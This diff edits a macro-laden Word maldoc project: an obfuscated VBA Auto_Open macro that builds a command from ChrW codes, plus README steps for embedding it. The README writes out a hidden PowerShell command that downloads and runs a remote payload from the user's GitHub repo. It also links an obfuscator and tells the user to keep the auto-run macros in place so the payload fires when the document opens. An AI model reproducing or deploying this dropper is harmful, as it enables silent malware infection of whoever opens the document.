@@ -25,6 +25,7 @@ Dim fifteenth As String
 Dim sixteenth As String
 Dim seventeenth As String
 Dim cmd As String
+' This part might vary depending on your GitHub username, the repo name and the branch.
 first = ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108)
 second = ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(119) & ChrW(32) & ChrW(104) & ChrW(105)
 third = ChrW(100) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(32) & ChrW(45) & ChrW(99) & ChrW(32) & ChrW(34) & ChrW(73)
@@ -82,7 +83,7 @@ Then, look for [thing]. That will be your IP address.
 3. Using the [command obfuscator for VBA](https://www.dropbox.com/s/38g95s4g2v7eclj/Obfuscate.jar?dl=1), obfuscate `powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/[your username]/[repo name]/[branch name]/payload.txt'))"`. Replace [your username] with your GitHub username, [repo name] with the name of the repo created in step 1 and [branch name] with the name of the branch that has `payload.txt` in it.
 4. Open `document.docm` in MS Word.
 5. Edit the `Auto_Open` macro (View > Macros > View Macros > Auto_Open).
-6. Select everthing, including the other `Sub`s (functions).
+6. Select everthing, including the other `Subs` (macros).
 7. Paste the code from step 3 (already copied to clipboard).
 8. Click the purple floppy disk icon in the top left to save the macro, than X out of that window.
 9. Then you can do whatever with the document (making sure not to delete the `Auto_Open`, `AutoOpen` and `Workbook_Open` macros).
